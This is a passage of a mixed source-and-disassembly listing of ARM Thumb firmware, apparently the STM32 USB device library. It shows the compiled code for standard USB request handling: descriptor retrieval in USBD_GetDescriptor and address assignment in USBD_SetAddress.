 800ba70:	f000 fb85 	bl	800c17e <USBD_CtlError>
              break;
 800ba74:	bf00      	nop
          }
          break;
 800ba76:	e004      	b.n	800ba82 <USBD_StdEPReq+0x322>

        default:
          USBD_CtlError(pdev, req);
 800ba78:	6839      	ldr	r1, [r7, #0]
 800ba7a:	6878      	ldr	r0, [r7, #4]
 800ba7c:	f000 fb7f 	bl	800c17e <USBD_CtlError>
          break;
 800ba80:	bf00      	nop
      }
      break;
 800ba82:	e005      	b.n	800ba90 <USBD_StdEPReq+0x330>

    default:
      USBD_CtlError(pdev, req);
 800ba84:	6839      	ldr	r1, [r7, #0]
 800ba86:	6878      	ldr	r0, [r7, #4]
 800ba88:	f000 fb79 	bl	800c17e <USBD_CtlError>
      break;
 800ba8c:	e000      	b.n	800ba90 <USBD_StdEPReq+0x330>
      break;
 800ba8e:	bf00      	nop
  }

  return ret;
 800ba90:	7bfb      	ldrb	r3, [r7, #15]
}
 800ba92:	4618      	mov	r0, r3
 800ba94:	3710      	adds	r7, #16
 800ba96:	46bd      	mov	sp, r7
 800ba98:	bd80      	pop	{r7, pc}
	...

0800ba9c <USBD_GetDescriptor>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetDescriptor(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800ba9c:	b580      	push	{r7, lr}
 800ba9e:	b084      	sub	sp, #16
 800baa0:	af00      	add	r7, sp, #0
 800baa2:	6078      	str	r0, [r7, #4]
 800baa4:	6039      	str	r1, [r7, #0]
  uint16_t len = 0U;
 800baa6:	2300      	movs	r3, #0
 800baa8:	813b      	strh	r3, [r7, #8]
  uint8_t *pbuf = NULL;
 800baaa:	2300      	movs	r3, #0
 800baac:	60fb      	str	r3, [r7, #12]
  uint8_t err = 0U;
 800baae:	2300      	movs	r3, #0
 800bab0:	72fb      	strb	r3, [r7, #11]

  switch (req->wValue >> 8)
 800bab2:	683b      	ldr	r3, [r7, #0]
 800bab4:	885b      	ldrh	r3, [r3, #2]
 800bab6:	0a1b      	lsrs	r3, r3, #8
 800bab8:	b29b      	uxth	r3, r3
 800baba:	3b01      	subs	r3, #1
 800babc:	2b0e      	cmp	r3, #14
 800babe:	f200 8152 	bhi.w	800bd66 <USBD_GetDescriptor+0x2ca>
 800bac2:	a201      	add	r2, pc, #4	; (adr r2, 800bac8 <USBD_GetDescriptor+0x2c>)
 800bac4:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800bac8:	0800bb39 	.word	0x0800bb39
 800bacc:	0800bb51 	.word	0x0800bb51
 800bad0:	0800bb91 	.word	0x0800bb91
 800bad4:	0800bd67 	.word	0x0800bd67
 800bad8:	0800bd67 	.word	0x0800bd67
 800badc:	0800bd07 	.word	0x0800bd07
 800bae0:	0800bd33 	.word	0x0800bd33
 800bae4:	0800bd67 	.word	0x0800bd67
 800bae8:	0800bd67 	.word	0x0800bd67
 800baec:	0800bd67 	.word	0x0800bd67
 800baf0:	0800bd67 	.word	0x0800bd67
 800baf4:	0800bd67 	.word	0x0800bd67
 800baf8:	0800bd67 	.word	0x0800bd67
 800bafc:	0800bd67 	.word	0x0800bd67
 800bb00:	0800bb05 	.word	0x0800bb05
  {
#if ((USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U))
    case USB_DESC_TYPE_BOS:
      if (pdev->pDesc->GetBOSDescriptor != NULL)
 800bb04:	687b      	ldr	r3, [r7, #4]
 800bb06:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb0a:	69db      	ldr	r3, [r3, #28]
 800bb0c:	2b00      	cmp	r3, #0
 800bb0e:	d00b      	beq.n	800bb28 <USBD_GetDescriptor+0x8c>
      {
        pbuf = pdev->pDesc->GetBOSDescriptor(pdev->dev_speed, &len);
 800bb10:	687b      	ldr	r3, [r7, #4]
 800bb12:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb16:	69db      	ldr	r3, [r3, #28]
 800bb18:	687a      	ldr	r2, [r7, #4]
 800bb1a:	7c12      	ldrb	r2, [r2, #16]
 800bb1c:	f107 0108 	add.w	r1, r7, #8
 800bb20:	4610      	mov	r0, r2
 800bb22:	4798      	blx	r3
 800bb24:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bb26:	e126      	b.n	800bd76 <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bb28:	6839      	ldr	r1, [r7, #0]
 800bb2a:	6878      	ldr	r0, [r7, #4]
 800bb2c:	f000 fb27 	bl	800c17e <USBD_CtlError>
        err++;
 800bb30:	7afb      	ldrb	r3, [r7, #11]
 800bb32:	3301      	adds	r3, #1
 800bb34:	72fb      	strb	r3, [r7, #11]
      break;
 800bb36:	e11e      	b.n	800bd76 <USBD_GetDescriptor+0x2da>
#endif /* (USBD_LPM_ENABLED == 1U) || (USBD_CLASS_BOS_ENABLED == 1U) */
    case USB_DESC_TYPE_DEVICE:
      pbuf = pdev->pDesc->GetDeviceDescriptor(pdev->dev_speed, &len);
 800bb38:	687b      	ldr	r3, [r7, #4]
 800bb3a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bb3e:	681b      	ldr	r3, [r3, #0]
 800bb40:	687a      	ldr	r2, [r7, #4]
 800bb42:	7c12      	ldrb	r2, [r2, #16]
 800bb44:	f107 0108 	add.w	r1, r7, #8
 800bb48:	4610      	mov	r0, r2
 800bb4a:	4798      	blx	r3
 800bb4c:	60f8      	str	r0, [r7, #12]
      break;
 800bb4e:	e112      	b.n	800bd76 <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bb50:	687b      	ldr	r3, [r7, #4]
 800bb52:	7c1b      	ldrb	r3, [r3, #16]
 800bb54:	2b00      	cmp	r3, #0
 800bb56:	d10d      	bne.n	800bb74 <USBD_GetDescriptor+0xd8>
          pbuf   = (uint8_t *)USBD_CMPSIT.GetHSConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetHSConfigDescriptor(&len);
 800bb58:	687b      	ldr	r3, [r7, #4]
 800bb5a:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bb5e:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800bb60:	f107 0208 	add.w	r2, r7, #8
 800bb64:	4610      	mov	r0, r2
 800bb66:	4798      	blx	r3
 800bb68:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bb6a:	68fb      	ldr	r3, [r7, #12]
 800bb6c:	3301      	adds	r3, #1
 800bb6e:	2202      	movs	r2, #2
 800bb70:	701a      	strb	r2, [r3, #0]
        {
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
        }
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
      }
      break;
 800bb72:	e100      	b.n	800bd76 <USBD_GetDescriptor+0x2da>
          pbuf   = (uint8_t *)pdev->pClass[0]->GetFSConfigDescriptor(&len);
 800bb74:	687b      	ldr	r3, [r7, #4]
 800bb76:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bb7a:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 800bb7c:	f107 0208 	add.w	r2, r7, #8
 800bb80:	4610      	mov	r0, r2
 800bb82:	4798      	blx	r3
 800bb84:	60f8      	str	r0, [r7, #12]
        pbuf[1] = USB_DESC_TYPE_CONFIGURATION;
 800bb86:	68fb      	ldr	r3, [r7, #12]
 800bb88:	3301      	adds	r3, #1
 800bb8a:	2202      	movs	r2, #2
 800bb8c:	701a      	strb	r2, [r3, #0]
      break;
 800bb8e:	e0f2      	b.n	800bd76 <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_STRING:
      switch ((uint8_t)(req->wValue))
 800bb90:	683b      	ldr	r3, [r7, #0]
 800bb92:	885b      	ldrh	r3, [r3, #2]
 800bb94:	b2db      	uxtb	r3, r3
 800bb96:	2b05      	cmp	r3, #5
 800bb98:	f200 80ac 	bhi.w	800bcf4 <USBD_GetDescriptor+0x258>
 800bb9c:	a201      	add	r2, pc, #4	; (adr r2, 800bba4 <USBD_GetDescriptor+0x108>)
 800bb9e:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800bba2:	bf00      	nop
 800bba4:	0800bbbd 	.word	0x0800bbbd
 800bba8:	0800bbf1 	.word	0x0800bbf1
 800bbac:	0800bc25 	.word	0x0800bc25
 800bbb0:	0800bc59 	.word	0x0800bc59
 800bbb4:	0800bc8d 	.word	0x0800bc8d
 800bbb8:	0800bcc1 	.word	0x0800bcc1
      {
        case USBD_IDX_LANGID_STR:
          if (pdev->pDesc->GetLangIDStrDescriptor != NULL)
 800bbbc:	687b      	ldr	r3, [r7, #4]
 800bbbe:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bbc2:	685b      	ldr	r3, [r3, #4]
 800bbc4:	2b00      	cmp	r3, #0
 800bbc6:	d00b      	beq.n	800bbe0 <USBD_GetDescriptor+0x144>
          {
            pbuf = pdev->pDesc->GetLangIDStrDescriptor(pdev->dev_speed, &len);
 800bbc8:	687b      	ldr	r3, [r7, #4]
 800bbca:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bbce:	685b      	ldr	r3, [r3, #4]
 800bbd0:	687a      	ldr	r2, [r7, #4]
 800bbd2:	7c12      	ldrb	r2, [r2, #16]
 800bbd4:	f107 0108 	add.w	r1, r7, #8
 800bbd8:	4610      	mov	r0, r2
 800bbda:	4798      	blx	r3
 800bbdc:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bbde:	e091      	b.n	800bd04 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bbe0:	6839      	ldr	r1, [r7, #0]
 800bbe2:	6878      	ldr	r0, [r7, #4]
 800bbe4:	f000 facb 	bl	800c17e <USBD_CtlError>
            err++;
 800bbe8:	7afb      	ldrb	r3, [r7, #11]
 800bbea:	3301      	adds	r3, #1
 800bbec:	72fb      	strb	r3, [r7, #11]
          break;
 800bbee:	e089      	b.n	800bd04 <USBD_GetDescriptor+0x268>

        case USBD_IDX_MFC_STR:
          if (pdev->pDesc->GetManufacturerStrDescriptor != NULL)
 800bbf0:	687b      	ldr	r3, [r7, #4]
 800bbf2:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bbf6:	689b      	ldr	r3, [r3, #8]
 800bbf8:	2b00      	cmp	r3, #0
 800bbfa:	d00b      	beq.n	800bc14 <USBD_GetDescriptor+0x178>
          {
            pbuf = pdev->pDesc->GetManufacturerStrDescriptor(pdev->dev_speed, &len);
 800bbfc:	687b      	ldr	r3, [r7, #4]
 800bbfe:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc02:	689b      	ldr	r3, [r3, #8]
 800bc04:	687a      	ldr	r2, [r7, #4]
 800bc06:	7c12      	ldrb	r2, [r2, #16]
 800bc08:	f107 0108 	add.w	r1, r7, #8
 800bc0c:	4610      	mov	r0, r2
 800bc0e:	4798      	blx	r3
 800bc10:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc12:	e077      	b.n	800bd04 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc14:	6839      	ldr	r1, [r7, #0]
 800bc16:	6878      	ldr	r0, [r7, #4]
 800bc18:	f000 fab1 	bl	800c17e <USBD_CtlError>
            err++;
 800bc1c:	7afb      	ldrb	r3, [r7, #11]
 800bc1e:	3301      	adds	r3, #1
 800bc20:	72fb      	strb	r3, [r7, #11]
          break;
 800bc22:	e06f      	b.n	800bd04 <USBD_GetDescriptor+0x268>

        case USBD_IDX_PRODUCT_STR:
          if (pdev->pDesc->GetProductStrDescriptor != NULL)
 800bc24:	687b      	ldr	r3, [r7, #4]
 800bc26:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc2a:	68db      	ldr	r3, [r3, #12]
 800bc2c:	2b00      	cmp	r3, #0
 800bc2e:	d00b      	beq.n	800bc48 <USBD_GetDescriptor+0x1ac>
          {
            pbuf = pdev->pDesc->GetProductStrDescriptor(pdev->dev_speed, &len);
 800bc30:	687b      	ldr	r3, [r7, #4]
 800bc32:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc36:	68db      	ldr	r3, [r3, #12]
 800bc38:	687a      	ldr	r2, [r7, #4]
 800bc3a:	7c12      	ldrb	r2, [r2, #16]
 800bc3c:	f107 0108 	add.w	r1, r7, #8
 800bc40:	4610      	mov	r0, r2
 800bc42:	4798      	blx	r3
 800bc44:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc46:	e05d      	b.n	800bd04 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc48:	6839      	ldr	r1, [r7, #0]
 800bc4a:	6878      	ldr	r0, [r7, #4]
 800bc4c:	f000 fa97 	bl	800c17e <USBD_CtlError>
            err++;
 800bc50:	7afb      	ldrb	r3, [r7, #11]
 800bc52:	3301      	adds	r3, #1
 800bc54:	72fb      	strb	r3, [r7, #11]
          break;
 800bc56:	e055      	b.n	800bd04 <USBD_GetDescriptor+0x268>

        case USBD_IDX_SERIAL_STR:
          if (pdev->pDesc->GetSerialStrDescriptor != NULL)
 800bc58:	687b      	ldr	r3, [r7, #4]
 800bc5a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc5e:	691b      	ldr	r3, [r3, #16]
 800bc60:	2b00      	cmp	r3, #0
 800bc62:	d00b      	beq.n	800bc7c <USBD_GetDescriptor+0x1e0>
          {
            pbuf = pdev->pDesc->GetSerialStrDescriptor(pdev->dev_speed, &len);
 800bc64:	687b      	ldr	r3, [r7, #4]
 800bc66:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc6a:	691b      	ldr	r3, [r3, #16]
 800bc6c:	687a      	ldr	r2, [r7, #4]
 800bc6e:	7c12      	ldrb	r2, [r2, #16]
 800bc70:	f107 0108 	add.w	r1, r7, #8
 800bc74:	4610      	mov	r0, r2
 800bc76:	4798      	blx	r3
 800bc78:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bc7a:	e043      	b.n	800bd04 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bc7c:	6839      	ldr	r1, [r7, #0]
 800bc7e:	6878      	ldr	r0, [r7, #4]
 800bc80:	f000 fa7d 	bl	800c17e <USBD_CtlError>
            err++;
 800bc84:	7afb      	ldrb	r3, [r7, #11]
 800bc86:	3301      	adds	r3, #1
 800bc88:	72fb      	strb	r3, [r7, #11]
          break;
 800bc8a:	e03b      	b.n	800bd04 <USBD_GetDescriptor+0x268>

        case USBD_IDX_CONFIG_STR:
          if (pdev->pDesc->GetConfigurationStrDescriptor != NULL)
 800bc8c:	687b      	ldr	r3, [r7, #4]
 800bc8e:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc92:	695b      	ldr	r3, [r3, #20]
 800bc94:	2b00      	cmp	r3, #0
 800bc96:	d00b      	beq.n	800bcb0 <USBD_GetDescriptor+0x214>
          {
            pbuf = pdev->pDesc->GetConfigurationStrDescriptor(pdev->dev_speed, &len);
 800bc98:	687b      	ldr	r3, [r7, #4]
 800bc9a:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bc9e:	695b      	ldr	r3, [r3, #20]
 800bca0:	687a      	ldr	r2, [r7, #4]
 800bca2:	7c12      	ldrb	r2, [r2, #16]
 800bca4:	f107 0108 	add.w	r1, r7, #8
 800bca8:	4610      	mov	r0, r2
 800bcaa:	4798      	blx	r3
 800bcac:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bcae:	e029      	b.n	800bd04 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bcb0:	6839      	ldr	r1, [r7, #0]
 800bcb2:	6878      	ldr	r0, [r7, #4]
 800bcb4:	f000 fa63 	bl	800c17e <USBD_CtlError>
            err++;
 800bcb8:	7afb      	ldrb	r3, [r7, #11]
 800bcba:	3301      	adds	r3, #1
 800bcbc:	72fb      	strb	r3, [r7, #11]
          break;
 800bcbe:	e021      	b.n	800bd04 <USBD_GetDescriptor+0x268>

        case USBD_IDX_INTERFACE_STR:
          if (pdev->pDesc->GetInterfaceStrDescriptor != NULL)
 800bcc0:	687b      	ldr	r3, [r7, #4]
 800bcc2:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bcc6:	699b      	ldr	r3, [r3, #24]
 800bcc8:	2b00      	cmp	r3, #0
 800bcca:	d00b      	beq.n	800bce4 <USBD_GetDescriptor+0x248>
          {
            pbuf = pdev->pDesc->GetInterfaceStrDescriptor(pdev->dev_speed, &len);
 800bccc:	687b      	ldr	r3, [r7, #4]
 800bcce:	f8d3 32b4 	ldr.w	r3, [r3, #692]	; 0x2b4
 800bcd2:	699b      	ldr	r3, [r3, #24]
 800bcd4:	687a      	ldr	r2, [r7, #4]
 800bcd6:	7c12      	ldrb	r2, [r2, #16]
 800bcd8:	f107 0108 	add.w	r1, r7, #8
 800bcdc:	4610      	mov	r0, r2
 800bcde:	4798      	blx	r3
 800bce0:	60f8      	str	r0, [r7, #12]
          else
          {
            USBD_CtlError(pdev, req);
            err++;
          }
          break;
 800bce2:	e00f      	b.n	800bd04 <USBD_GetDescriptor+0x268>
            USBD_CtlError(pdev, req);
 800bce4:	6839      	ldr	r1, [r7, #0]
 800bce6:	6878      	ldr	r0, [r7, #4]
 800bce8:	f000 fa49 	bl	800c17e <USBD_CtlError>
            err++;
 800bcec:	7afb      	ldrb	r3, [r7, #11]
 800bcee:	3301      	adds	r3, #1
 800bcf0:	72fb      	strb	r3, [r7, #11]
          break;
 800bcf2:	e007      	b.n	800bd04 <USBD_GetDescriptor+0x268>
            err++;
          }
#endif /* USBD_SUPPORT_USER_STRING_DESC  */

#if ((USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U))
          USBD_CtlError(pdev, req);
 800bcf4:	6839      	ldr	r1, [r7, #0]
 800bcf6:	6878      	ldr	r0, [r7, #4]
 800bcf8:	f000 fa41 	bl	800c17e <USBD_CtlError>
          err++;
 800bcfc:	7afb      	ldrb	r3, [r7, #11]
 800bcfe:	3301      	adds	r3, #1
 800bd00:	72fb      	strb	r3, [r7, #11]
#endif /* (USBD_CLASS_USER_STRING_DESC == 0U) && (USBD_SUPPORT_USER_STRING_DESC == 0U) */
          break;
 800bd02:	bf00      	nop
      }
      break;
 800bd04:	e037      	b.n	800bd76 <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_DEVICE_QUALIFIER:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bd06:	687b      	ldr	r3, [r7, #4]
 800bd08:	7c1b      	ldrb	r3, [r3, #16]
 800bd0a:	2b00      	cmp	r3, #0
 800bd0c:	d109      	bne.n	800bd22 <USBD_GetDescriptor+0x286>
          pbuf = (uint8_t *)USBD_CMPSIT.GetDeviceQualifierDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetDeviceQualifierDescriptor(&len);
 800bd0e:	687b      	ldr	r3, [r7, #4]
 800bd10:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bd14:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 800bd16:	f107 0208 	add.w	r2, r7, #8
 800bd1a:	4610      	mov	r0, r2
 800bd1c:	4798      	blx	r3
 800bd1e:	60f8      	str	r0, [r7, #12]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bd20:	e029      	b.n	800bd76 <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bd22:	6839      	ldr	r1, [r7, #0]
 800bd24:	6878      	ldr	r0, [r7, #4]
 800bd26:	f000 fa2a 	bl	800c17e <USBD_CtlError>
        err++;
 800bd2a:	7afb      	ldrb	r3, [r7, #11]
 800bd2c:	3301      	adds	r3, #1
 800bd2e:	72fb      	strb	r3, [r7, #11]
      break;
 800bd30:	e021      	b.n	800bd76 <USBD_GetDescriptor+0x2da>

    case USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION:
      if (pdev->dev_speed == USBD_SPEED_HIGH)
 800bd32:	687b      	ldr	r3, [r7, #4]
 800bd34:	7c1b      	ldrb	r3, [r3, #16]
 800bd36:	2b00      	cmp	r3, #0
 800bd38:	d10d      	bne.n	800bd56 <USBD_GetDescriptor+0x2ba>
          pbuf = (uint8_t *)USBD_CMPSIT.GetOtherSpeedConfigDescriptor(&len);
        }
        else
#endif /* USE_USBD_COMPOSITE */
        {
          pbuf = (uint8_t *)pdev->pClass[0]->GetOtherSpeedConfigDescriptor(&len);
 800bd3a:	687b      	ldr	r3, [r7, #4]
 800bd3c:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800bd40:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 800bd42:	f107 0208 	add.w	r2, r7, #8
 800bd46:	4610      	mov	r0, r2
 800bd48:	4798      	blx	r3
 800bd4a:	60f8      	str	r0, [r7, #12]
        }
        pbuf[1] = USB_DESC_TYPE_OTHER_SPEED_CONFIGURATION;
 800bd4c:	68fb      	ldr	r3, [r7, #12]
 800bd4e:	3301      	adds	r3, #1
 800bd50:	2207      	movs	r2, #7
 800bd52:	701a      	strb	r2, [r3, #0]
      else
      {
        USBD_CtlError(pdev, req);
        err++;
      }
      break;
 800bd54:	e00f      	b.n	800bd76 <USBD_GetDescriptor+0x2da>
        USBD_CtlError(pdev, req);
 800bd56:	6839      	ldr	r1, [r7, #0]
 800bd58:	6878      	ldr	r0, [r7, #4]
 800bd5a:	f000 fa10 	bl	800c17e <USBD_CtlError>
        err++;
 800bd5e:	7afb      	ldrb	r3, [r7, #11]
 800bd60:	3301      	adds	r3, #1
 800bd62:	72fb      	strb	r3, [r7, #11]
      break;
 800bd64:	e007      	b.n	800bd76 <USBD_GetDescriptor+0x2da>

    default:
      USBD_CtlError(pdev, req);
 800bd66:	6839      	ldr	r1, [r7, #0]
 800bd68:	6878      	ldr	r0, [r7, #4]
 800bd6a:	f000 fa08 	bl	800c17e <USBD_CtlError>
      err++;
 800bd6e:	7afb      	ldrb	r3, [r7, #11]
 800bd70:	3301      	adds	r3, #1
 800bd72:	72fb      	strb	r3, [r7, #11]
      break;
 800bd74:	bf00      	nop
  }

  if (err != 0U)
 800bd76:	7afb      	ldrb	r3, [r7, #11]
 800bd78:	2b00      	cmp	r3, #0
 800bd7a:	d11e      	bne.n	800bdba <USBD_GetDescriptor+0x31e>
  {
    return;
  }

  if (req->wLength != 0U)
 800bd7c:	683b      	ldr	r3, [r7, #0]
 800bd7e:	88db      	ldrh	r3, [r3, #6]
 800bd80:	2b00      	cmp	r3, #0
 800bd82:	d016      	beq.n	800bdb2 <USBD_GetDescriptor+0x316>
  {
    if (len != 0U)
 800bd84:	893b      	ldrh	r3, [r7, #8]
 800bd86:	2b00      	cmp	r3, #0
 800bd88:	d00e      	beq.n	800bda8 <USBD_GetDescriptor+0x30c>
    {
      len = MIN(len, req->wLength);
 800bd8a:	683b      	ldr	r3, [r7, #0]
 800bd8c:	88da      	ldrh	r2, [r3, #6]
 800bd8e:	893b      	ldrh	r3, [r7, #8]
 800bd90:	4293      	cmp	r3, r2
 800bd92:	bf28      	it	cs
 800bd94:	4613      	movcs	r3, r2
 800bd96:	b29b      	uxth	r3, r3
 800bd98:	813b      	strh	r3, [r7, #8]
      (void)USBD_CtlSendData(pdev, pbuf, len);
 800bd9a:	893b      	ldrh	r3, [r7, #8]
 800bd9c:	461a      	mov	r2, r3
 800bd9e:	68f9      	ldr	r1, [r7, #12]
 800bda0:	6878      	ldr	r0, [r7, #4]
 800bda2:	f000 fa5d 	bl	800c260 <USBD_CtlSendData>
 800bda6:	e009      	b.n	800bdbc <USBD_GetDescriptor+0x320>
    }
    else
    {
      USBD_CtlError(pdev, req);
 800bda8:	6839      	ldr	r1, [r7, #0]
 800bdaa:	6878      	ldr	r0, [r7, #4]
 800bdac:	f000 f9e7 	bl	800c17e <USBD_CtlError>
 800bdb0:	e004      	b.n	800bdbc <USBD_GetDescriptor+0x320>
    }
  }
  else
  {
    (void)USBD_CtlSendStatus(pdev);
 800bdb2:	6878      	ldr	r0, [r7, #4]
 800bdb4:	f000 faae 	bl	800c314 <USBD_CtlSendStatus>
 800bdb8:	e000      	b.n	800bdbc <USBD_GetDescriptor+0x320>
    return;
 800bdba:	bf00      	nop
  }
}
 800bdbc:	3710      	adds	r7, #16
 800bdbe:	46bd      	mov	sp, r7
 800bdc0:	bd80      	pop	{r7, pc}
 800bdc2:	bf00      	nop

0800bdc4 <USBD_SetAddress>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetAddress(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bdc4:	b580      	push	{r7, lr}
 800bdc6:	b084      	sub	sp, #16
 800bdc8:	af00      	add	r7, sp, #0
 800bdca:	6078      	str	r0, [r7, #4]
 800bdcc:	6039      	str	r1, [r7, #0]
  uint8_t  dev_addr;

  if ((req->wIndex == 0U) && (req->wLength == 0U) && (req->wValue < 128U))
 800bdce:	683b      	ldr	r3, [r7, #0]
 800bdd0:	889b      	ldrh	r3, [r3, #4]
 800bdd2:	2b00      	cmp	r3, #0
 800bdd4:	d131      	bne.n	800be3a <USBD_SetAddress+0x76>
 800bdd6:	683b      	ldr	r3, [r7, #0]
 800bdd8:	88db      	ldrh	r3, [r3, #6]
 800bdda:	2b00      	cmp	r3, #0
 800bddc:	d12d      	bne.n	800be3a <USBD_SetAddress+0x76>
 800bdde:	683b      	ldr	r3, [r7, #0]
 800bde0:	885b      	ldrh	r3, [r3, #2]
 800bde2:	2b7f      	cmp	r3, #127	; 0x7f
 800bde4:	d829      	bhi.n	800be3a <USBD_SetAddress+0x76>
  {
    dev_addr = (uint8_t)(req->wValue) & 0x7FU;
 800bde6:	683b      	ldr	r3, [r7, #0]
 800bde8:	885b      	ldrh	r3, [r3, #2]
 800bdea:	b2db      	uxtb	r3, r3
 800bdec:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800bdf0:	73fb      	strb	r3, [r7, #15]

    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800bdf2:	687b      	ldr	r3, [r7, #4]
 800bdf4:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bdf8:	b2db      	uxtb	r3, r3
 800bdfa:	2b03      	cmp	r3, #3
 800bdfc:	d104      	bne.n	800be08 <USBD_SetAddress+0x44>
    {
      USBD_CtlError(pdev, req);
 800bdfe:	6839      	ldr	r1, [r7, #0]
 800be00:	6878      	ldr	r0, [r7, #4]
 800be02:	f000 f9bc 	bl	800c17e <USBD_CtlError>
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be06:	e01d      	b.n	800be44 <USBD_SetAddress+0x80>
    }
    else
    {
      pdev->dev_address = dev_addr;
 800be08:	687b      	ldr	r3, [r7, #4]
 800be0a:	7bfa      	ldrb	r2, [r7, #15]
 800be0c:	f883 229e 	strb.w	r2, [r3, #670]	; 0x29e
      (void)USBD_LL_SetUSBAddress(pdev, dev_addr);
 800be10:	7bfb      	ldrb	r3, [r7, #15]
 800be12:	4619      	mov	r1, r3
 800be14:	6878      	ldr	r0, [r7, #4]
 800be16:	f000 ffbf 	bl	800cd98 <USBD_LL_SetUSBAddress>
      (void)USBD_CtlSendStatus(pdev);
 800be1a:	6878      	ldr	r0, [r7, #4]
 800be1c:	f000 fa7a 	bl	800c314 <USBD_CtlSendStatus>

      if (dev_addr != 0U)
 800be20:	7bfb      	ldrb	r3, [r7, #15]
 800be22:	2b00      	cmp	r3, #0
 800be24:	d004      	beq.n	800be30 <USBD_SetAddress+0x6c>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800be26:	687b      	ldr	r3, [r7, #4]
 800be28:	2202      	movs	r2, #2
 800be2a:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be2e:	e009      	b.n	800be44 <USBD_SetAddress+0x80>
      }
      else
      {
        pdev->dev_state = USBD_STATE_DEFAULT;
 800be30:	687b      	ldr	r3, [r7, #4]
 800be32:	2201      	movs	r2, #1
 800be34:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
    if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800be38:	e004      	b.n	800be44 <USBD_SetAddress+0x80>
      }
    }
  }
  else
  {
    USBD_CtlError(pdev, req);
 800be3a:	6839      	ldr	r1, [r7, #0]
 800be3c:	6878      	ldr	r0, [r7, #4]
 800be3e:	f000 f99e 	bl	800c17e <USBD_CtlError>
  }
}
 800be42:	bf00      	nop
 800be44:	bf00      	nop
 800be46:	3710      	adds	r7, #16
 800be48:	46bd      	mov	sp, r7
 800be4a:	bd80      	pop	{r7, pc}

0800be4c <USBD_SetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
